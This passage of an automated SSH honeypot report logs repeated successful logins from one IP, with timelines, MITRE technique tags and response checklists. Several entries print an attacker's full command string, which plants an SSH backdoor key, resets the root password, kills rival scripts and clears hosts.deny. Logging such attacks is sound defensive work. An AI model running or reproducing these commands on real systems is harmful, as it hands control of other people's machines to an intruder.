| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 07:22:55` | `cowrie.session.connect` |
| `2026-04-08 07:22:55` | `cowrie.client.version` |
| `2026-04-08 07:22:56` | `cowrie.client.kex` |
| `2026-04-08 07:23:00` | `cowrie.login.success` |
| `2026-04-08 07:23:00` | `cowrie.session.params` |
| `2026-04-08 07:23:00` | `cowrie.command.input` |
| `2026-04-08 07:23:00` | `cowrie.command.failed` |
| `2026-04-08 07:23:00` | `cowrie.log.closed` |
| `2026-04-08 07:23:01` | `cowrie.session.params` |
| `2026-04-08 07:23:01` | `cowrie.command.input` |
| `2026-04-08 07:23:01` | `cowrie.session.file_download` |
| `2026-04-08 07:23:01` | `cowrie.log.closed` |
| `2026-04-08 07:23:12` | `cowrie.session.params` |
| `2026-04-08 07:23:12` | `cowrie.command.input` |
| `2026-04-08 07:23:13` | `cowrie.log.closed` |
| `2026-04-08 07:23:13` | `cowrie.session.params` |
| `2026-04-08 07:23:13` | `cowrie.command.input` |
| `2026-04-08 07:23:14` | `cowrie.log.closed` |
| `2026-04-08 07:23:14` | `cowrie.session.params` |
| `2026-04-08 07:23:14` | `cowrie.command.input` |
| `2026-04-08 07:23:14` | `cowrie.session.file_download` |
| `2026-04-08 07:23:14` | `cowrie.log.closed` |
| `2026-04-08 07:23:16` | `cowrie.session.params` |
| `2026-04-08 07:23:16` | `cowrie.command.input` |
| `2026-04-08 07:23:18` | `cowrie.log.closed` |
| `2026-04-08 07:23:18` | `cowrie.session.params` |
| `2026-04-08 07:23:18` | `cowrie.command.input` |
| `2026-04-08 07:23:19` | `cowrie.log.closed` |
| `2026-04-08 07:23:20` | `cowrie.session.params` |
| `2026-04-08 07:23:20` | `cowrie.command.input` |
| `2026-04-08 07:23:20` | `cowrie.command.input` |
| `2026-04-08 07:23:20` | `cowrie.log.closed` |
| `2026-04-08 07:23:21` | `cowrie.session.params` |
| `2026-04-08 07:23:21` | `cowrie.command.input` |
| `2026-04-08 07:23:21` | `cowrie.log.closed` |
| `2026-04-08 07:23:25` | `cowrie.session.params` |
| `2026-04-08 07:23:25` | `cowrie.command.input` |
| `2026-04-08 07:23:49` | `cowrie.log.closed` |
| `2026-04-08 07:23:49` | `cowrie.session.params` |
| `2026-04-08 07:23:49` | `cowrie.command.input` |
| `2026-04-08 07:23:50` | `cowrie.log.closed` |
| `2026-04-08 07:23:50` | `cowrie.session.params` |
| `2026-04-08 07:23:50` | `cowrie.command.input` |
| `2026-04-08 07:23:50` | `cowrie.log.closed` |
| `2026-04-08 07:23:51` | `cowrie.session.params` |
| `2026-04-08 07:23:51` | `cowrie.command.input` |
| `2026-04-08 07:23:51` | `cowrie.log.closed` |
| `2026-04-08 07:23:51` | `cowrie.session.params` |
| `2026-04-08 07:23:51` | `cowrie.command.input` |
| `2026-04-08 07:23:51` | `cowrie.log.closed` |
| `2026-04-08 07:23:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.194[.]186` to AbuseIPDB if not already reported
- [ ] Block `45.78.194[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5e51d2c5d0f

| Field | Detail |
|---|---|
| **Source IP** | `45.78.194[.]186` |
| **First Seen** | 2026-04-08 07:23 |
| **Last Seen** | 2026-04-08 07:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 07:23:51` | `cowrie.session.connect` |
| `2026-04-08 07:23:51` | `cowrie.client.version` |
| `2026-04-08 07:23:51` | `cowrie.client.kex` |
| `2026-04-08 07:23:52` | `cowrie.login.success` |
| `2026-04-08 07:23:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.194[.]186` to AbuseIPDB if not already reported
- [ ] Block `45.78.194[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7cc73961a0fc

| Field | Detail |
|---|---|
| **Source IP** | `45.78.194[.]186` |
| **First Seen** | 2026-04-08 07:36 |
| **Last Seen** | 2026-04-08 07:36 |
| **Session Duration** | 45s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:HHs5Tr2ae9yT"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 07:36:06` | `cowrie.session.connect` |
| `2026-04-08 07:36:06` | `cowrie.client.version` |
| `2026-04-08 07:36:06` | `cowrie.client.kex` |
| `2026-04-08 07:36:08` | `cowrie.login.success` |
| `2026-04-08 07:36:11` | `cowrie.session.params` |
| `2026-04-08 07:36:11` | `cowrie.command.input` |
| `2026-04-08 07:36:11` | `cowrie.command.failed` |
| `2026-04-08 07:36:12` | `cowrie.log.closed` |
| `2026-04-08 07:36:15` | `cowrie.session.params` |
| `2026-04-08 07:36:15` | `cowrie.command.input` |
| `2026-04-08 07:36:15` | `cowrie.session.file_download` |
| `2026-04-08 07:36:15` | `cowrie.log.closed` |
| `2026-04-08 07:36:25` | `cowrie.session.params` |
| `2026-04-08 07:36:25` | `cowrie.command.input` |
| `2026-04-08 07:36:25` | `cowrie.log.closed` |
| `2026-04-08 07:36:25` | `cowrie.session.params` |
| `2026-04-08 07:36:25` | `cowrie.command.input` |
| `2026-04-08 07:36:26` | `cowrie.log.closed` |
| `2026-04-08 07:36:26` | `cowrie.session.params` |
| `2026-04-08 07:36:26` | `cowrie.command.input` |
| `2026-04-08 07:36:26` | `cowrie.session.file_download` |
| `2026-04-08 07:36:26` | `cowrie.log.closed` |
| `2026-04-08 07:36:28` | `cowrie.session.params` |
| `2026-04-08 07:36:28` | `cowrie.command.input` |
| `2026-04-08 07:36:28` | `cowrie.log.closed` |
| `2026-04-08 07:36:28` | `cowrie.session.params` |
| `2026-04-08 07:36:28` | `cowrie.command.input` |
| `2026-04-08 07:36:29` | `cowrie.log.closed` |
| `2026-04-08 07:36:29` | `cowrie.session.params` |
| `2026-04-08 07:36:29` | `cowrie.command.input` |
| `2026-04-08 07:36:29` | `cowrie.command.input` |
| `2026-04-08 07:36:29` | `cowrie.log.closed` |
| `2026-04-08 07:36:30` | `cowrie.session.params` |
| `2026-04-08 07:36:30` | `cowrie.command.input` |
| `2026-04-08 07:36:31` | `cowrie.log.closed` |
| `2026-04-08 07:36:31` | `cowrie.session.params` |
| `2026-04-08 07:36:31` | `cowrie.command.input` |
| `2026-04-08 07:36:31` | `cowrie.log.closed` |
| `2026-04-08 07:36:31` | `cowrie.session.params` |
| `2026-04-08 07:36:31` | `cowrie.command.input` |
| `2026-04-08 07:36:32` | `cowrie.log.closed` |
| `2026-04-08 07:36:32` | `cowrie.session.params` |
| `2026-04-08 07:36:32` | `cowrie.command.input` |
| `2026-04-08 07:36:32` | `cowrie.log.closed` |
| `2026-04-08 07:36:33` | `cowrie.session.params` |
| `2026-04-08 07:36:33` | `cowrie.command.input` |
| `2026-04-08 07:36:34` | `cowrie.log.closed` |
| `2026-04-08 07:36:34` | `cowrie.session.params` |
| `2026-04-08 07:36:34` | `cowrie.command.input` |
| `2026-04-08 07:36:40` | `cowrie.log.closed` |
| `2026-04-08 07:36:48` | `cowrie.session.params` |
| `2026-04-08 07:36:48` | `cowrie.command.input` |
| `2026-04-08 07:36:50` | `cowrie.log.closed` |
| `2026-04-08 07:36:50` | `cowrie.session.params` |
| `2026-04-08 07:36:50` | `cowrie.command.input` |
| `2026-04-08 07:36:52` | `cowrie.log.closed` |
| `2026-04-08 07:36:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.194[.]186` to AbuseIPDB if not already reported
- [ ] Block `45.78.194[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-853bfb1d7cb4

| Field | Detail |
|---|---|
| **Source IP** | `45.78.194[.]186` |
| **First Seen** | 2026-04-08 07:42 |
| **Last Seen** | 2026-04-08 07:43 |
| **Session Duration** | 50s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 07:42:24` | `cowrie.session.connect` |
| `2026-04-08 07:42:24` | `cowrie.client.version` |
| `2026-04-08 07:42:24` | `cowrie.client.kex` |
| `2026-04-08 07:42:25` | `cowrie.login.success` |
| `2026-04-08 07:42:26` | `cowrie.session.params` |
| `2026-04-08 07:42:26` | `cowrie.command.input` |
| `2026-04-08 07:42:26` | `cowrie.command.failed` |
| `2026-04-08 07:42:26` | `cowrie.log.closed` |
| `2026-04-08 07:42:27` | `cowrie.session.params` |
| `2026-04-08 07:42:27` | `cowrie.command.input` |
| `2026-04-08 07:43:14` | `cowrie.session.file_download` |
| `2026-04-08 07:43:14` | `cowrie.log.closed` |
| `2026-04-08 07:43:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.194[.]186` to AbuseIPDB if not already reported
- [ ] Block `45.78.194[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56278a17a276

| Field | Detail |
|---|---|
| **Source IP** | `45.78.194[.]186` |
| **First Seen** | 2026-04-08 07:42 |
| **Last Seen** | 2026-04-08 07:42 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 07:42:33` | `cowrie.session.connect` |
| `2026-04-08 07:42:33` | `cowrie.client.version` |
| `2026-04-08 07:42:34` | `cowrie.client.kex` |
| `2026-04-08 07:42:35` | `cowrie.login.success` |
| `2026-04-08 07:42:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.194[.]186` to AbuseIPDB if not already reported
- [ ] Block `45.78.194[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff3ff78e965e

| Field | Detail |
|---|---|
| **Source IP** | `45.78.194[.]186` |
| **First Seen** | 2026-04-08 07:51 |
| **Last Seen** | 2026-04-08 07:52 |
| **Session Duration** | 52s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:ohjN45uZErPj"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 07:51:41` | `cowrie.session.connect` |
| `2026-04-08 07:51:41` | `cowrie.client.version` |
| `2026-04-08 07:51:41` | `cowrie.client.kex` |
| `2026-04-08 07:51:42` | `cowrie.login.success` |
| `2026-04-08 07:51:43` | `cowrie.session.params` |
| `2026-04-08 07:51:43` | `cowrie.command.input` |
| `2026-04-08 07:51:43` | `cowrie.command.failed` |
| `2026-04-08 07:51:45` | `cowrie.log.closed` |
| `2026-04-08 07:51:45` | `cowrie.session.params` |
| `2026-04-08 07:51:45` | `cowrie.command.input` |
| `2026-04-08 07:51:46` | `cowrie.session.file_download` |
| `2026-04-08 07:51:46` | `cowrie.log.closed` |
| `2026-04-08 07:52:00` | `cowrie.session.params` |
| `2026-04-08 07:52:00` | `cowrie.command.input` |
| `2026-04-08 07:52:00` | `cowrie.log.closed` |
| `2026-04-08 07:52:01` | `cowrie.session.params` |
| `2026-04-08 07:52:01` | `cowrie.command.input` |
| `2026-04-08 07:52:01` | `cowrie.log.closed` |
| `2026-04-08 07:52:02` | `cowrie.session.params` |
| `2026-04-08 07:52:02` | `cowrie.command.input` |
| `2026-04-08 07:52:08` | `cowrie.session.file_download` |
| `2026-04-08 07:52:08` | `cowrie.log.closed` |
| `2026-04-08 07:52:10` | `cowrie.session.params` |
| `2026-04-08 07:52:10` | `cowrie.command.input` |
| `2026-04-08 07:52:10` | `cowrie.log.closed` |
| `2026-04-08 07:52:11` | `cowrie.session.params` |
| `2026-04-08 07:52:11` | `cowrie.command.input` |
| `2026-04-08 07:52:11` | `cowrie.command.input` |
| `2026-04-08 07:52:12` | `cowrie.log.closed` |
| `2026-04-08 07:52:12` | `cowrie.session.params` |
| `2026-04-08 07:52:12` | `cowrie.command.input` |
| `2026-04-08 07:52:13` | `cowrie.log.closed` |
| `2026-04-08 07:52:24` | `cowrie.session.params` |
| `2026-04-08 07:52:24` | `cowrie.command.input` |
| `2026-04-08 07:52:24` | `cowrie.log.closed` |
| `2026-04-08 07:52:25` | `cowrie.session.params` |
| `2026-04-08 07:52:25` | `cowrie.command.input` |
| `2026-04-08 07:52:25` | `cowrie.log.closed` |
| `2026-04-08 07:52:26` | `cowrie.session.params` |
| `2026-04-08 07:52:26` | `cowrie.command.input` |
| `2026-04-08 07:52:26` | `cowrie.log.closed` |
| `2026-04-08 07:52:27` | `cowrie.session.params` |
| `2026-04-08 07:52:27` | `cowrie.command.input` |
| `2026-04-08 07:52:28` | `cowrie.log.closed` |
| `2026-04-08 07:52:28` | `cowrie.session.params` |
| `2026-04-08 07:52:28` | `cowrie.command.input` |
| `2026-04-08 07:52:28` | `cowrie.log.closed` |
| `2026-04-08 07:52:29` | `cowrie.session.params` |
| `2026-04-08 07:52:29` | `cowrie.command.input` |
| `2026-04-08 07:52:29` | `cowrie.log.closed` |
| `2026-04-08 07:52:31` | `cowrie.session.params` |
| `2026-04-08 07:52:31` | `cowrie.command.input` |
| `2026-04-08 07:52:31` | `cowrie.log.closed` |
| `2026-04-08 07:52:32` | `cowrie.session.params` |
| `2026-04-08 07:52:32` | `cowrie.command.input` |
| `2026-04-08 07:52:32` | `cowrie.log.closed` |
| `2026-04-08 07:52:33` | `cowrie.session.params` |
| `2026-04-08 07:52:33` | `cowrie.command.input` |
| `2026-04-08 07:52:33` | `cowrie.log.closed` |
| `2026-04-08 07:52:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.194[.]186` to AbuseIPDB if not already reported
- [ ] Block `45.78.194[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c4d4032aad2

| Field | Detail |
|---|---|
| **Source IP** | `45.78.194[.]186` |
| **First Seen** | 2026-04-08 07:51 |
| **Last Seen** | 2026-04-08 07:52 |
| **Session Duration** | 52s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 07:51:49` | `cowrie.session.connect` |
| `2026-04-08 07:51:49` | `cowrie.client.version` |
| `2026-04-08 07:51:50` | `cowrie.client.kex` |
| `2026-04-08 07:52:42` | `cowrie.login.success` |
| `2026-04-08 07:52:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.194[.]186` to AbuseIPDB if not already reported
- [ ] Block `45.78.194[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31a60047cbdf

| Field | Detail |
|---|---|
| **Source IP** | `45.78.194[.]186` |
| **First Seen** | 2026-04-08 08:04 |
| **Last Seen** | 2026-04-08 08:04 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 08:04:10` | `cowrie.session.connect` |
| `2026-04-08 08:04:14` | `cowrie.client.version` |
| `2026-04-08 08:04:14` | `cowrie.client.kex` |
| `2026-04-08 08:04:16` | `cowrie.login.success` |
| `2026-04-08 08:04:22` | `cowrie.session.params` |
| `2026-04-08 08:04:22` | `cowrie.command.input` |
| `2026-04-08 08:04:22` | `cowrie.command.failed` |
| `2026-04-08 08:04:22` | `cowrie.log.closed` |
| `2026-04-08 08:04:23` | `cowrie.session.params` |
| `2026-04-08 08:04:23` | `cowrie.command.input` |
| `2026-04-08 08:04:23` | `cowrie.session.file_download` |
| `2026-04-08 08:04:23` | `cowrie.log.closed` |
| `2026-04-08 08:04:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.194[.]186` to AbuseIPDB if not already reported
- [ ] Block `45.78.194[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b1c7ec03dc9

| Field | Detail |
|---|---|
| **Source IP** | `45.78.194[.]186` |
| **First Seen** | 2026-04-08 08:04 |
| **Last Seen** | 2026-04-08 08:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 08:04:28` | `cowrie.session.connect` |
| `2026-04-08 08:04:28` | `cowrie.client.version` |
| `2026-04-08 08:04:28` | `cowrie.client.kex` |
| `2026-04-08 08:04:29` | `cowrie.login.success` |
| `2026-04-08 08:04:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.194[.]186` to AbuseIPDB if not already reported
- [ ] Block `45.78.194[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ed2932ed47f

| Field | Detail |
|---|---|
| **Source IP** | `45.78.194[.]186` |
| **First Seen** | 2026-04-08 08:13 |
| **Last Seen** | 2026-04-08 08:14 |
| **Session Duration** | 37s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:zpjM6nwOph5E"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 08:13:31` | `cowrie.session.connect` |
| `2026-04-08 08:13:31` | `cowrie.client.version` |
| `2026-04-08 08:13:31` | `cowrie.client.kex` |
| `2026-04-08 08:13:33` | `cowrie.login.success` |
| `2026-04-08 08:13:33` | `cowrie.session.params` |
| `2026-04-08 08:13:33` | `cowrie.command.input` |
| `2026-04-08 08:13:33` | `cowrie.command.failed` |
| `2026-04-08 08:13:33` | `cowrie.log.closed` |
| `2026-04-08 08:13:34` | `cowrie.session.params` |
| `2026-04-08 08:13:34` | `cowrie.command.input` |
| `2026-04-08 08:13:34` | `cowrie.session.file_download` |
| `2026-04-08 08:13:34` | `cowrie.log.closed` |
| `2026-04-08 08:13:45` | `cowrie.session.params` |
| `2026-04-08 08:13:45` | `cowrie.command.input` |
| `2026-04-08 08:13:45` | `cowrie.log.closed` |
| `2026-04-08 08:13:46` | `cowrie.session.params` |
| `2026-04-08 08:13:46` | `cowrie.command.input` |
| `2026-04-08 08:13:47` | `cowrie.log.closed` |
| `2026-04-08 08:13:49` | `cowrie.session.params` |
| `2026-04-08 08:13:49` | `cowrie.command.input` |
| `2026-04-08 08:13:49` | `cowrie.session.file_download` |
| `2026-04-08 08:13:49` | `cowrie.log.closed` |
| `2026-04-08 08:13:50` | `cowrie.session.params` |
| `2026-04-08 08:13:50` | `cowrie.command.input` |
| `2026-04-08 08:13:50` | `cowrie.log.closed` |
| `2026-04-08 08:13:50` | `cowrie.session.params` |
| `2026-04-08 08:13:50` | `cowrie.command.input` |
| `2026-04-08 08:13:51` | `cowrie.log.closed` |
| `2026-04-08 08:13:52` | `cowrie.session.params` |
| `2026-04-08 08:13:52` | `cowrie.command.input` |
| `2026-04-08 08:13:52` | `cowrie.command.input` |
| `2026-04-08 08:13:52` | `cowrie.log.closed` |
| `2026-04-08 08:13:53` | `cowrie.session.params` |
| `2026-04-08 08:13:53` | `cowrie.command.input` |
| `2026-04-08 08:13:53` | `cowrie.log.closed` |
| `2026-04-08 08:13:54` | `cowrie.session.params` |
| `2026-04-08 08:13:54` | `cowrie.command.input` |
| `2026-04-08 08:13:54` | `cowrie.log.closed` |
| `2026-04-08 08:13:54` | `cowrie.session.params` |
| `2026-04-08 08:13:54` | `cowrie.command.input` |
| `2026-04-08 08:13:55` | `cowrie.log.closed` |
| `2026-04-08 08:13:56` | `cowrie.session.params` |
| `2026-04-08 08:13:56` | `cowrie.command.input` |
| `2026-04-08 08:13:56` | `cowrie.log.closed` |
| `2026-04-08 08:13:58` | `cowrie.session.params` |
| `2026-04-08 08:13:58` | `cowrie.command.input` |
| `2026-04-08 08:13:58` | `cowrie.log.closed` |
| `2026-04-08 08:13:58` | `cowrie.session.params` |
| `2026-04-08 08:13:58` | `cowrie.command.input` |
| `2026-04-08 08:13:58` | `cowrie.log.closed` |
| `2026-04-08 08:13:59` | `cowrie.session.params` |
| `2026-04-08 08:13:59` | `cowrie.command.input` |
| `2026-04-08 08:13:59` | `cowrie.log.closed` |
| `2026-04-08 08:14:03` | `cowrie.session.params` |
| `2026-04-08 08:14:03` | `cowrie.command.input` |
| `2026-04-08 08:14:03` | `cowrie.log.closed` |
| `2026-04-08 08:14:05` | `cowrie.session.params` |
| `2026-04-08 08:14:05` | `cowrie.command.input` |
| `2026-04-08 08:14:05` | `cowrie.log.closed` |
| `2026-04-08 08:14:08` | `cowrie.session.params` |
| `2026-04-08 08:14:08` | `cowrie.command.input` |
| `2026-04-08 08:14:08` | `cowrie.log.closed` |
| `2026-04-08 08:14:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.194[.]186` to AbuseIPDB if not already reported
- [ ] Block `45.78.194[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
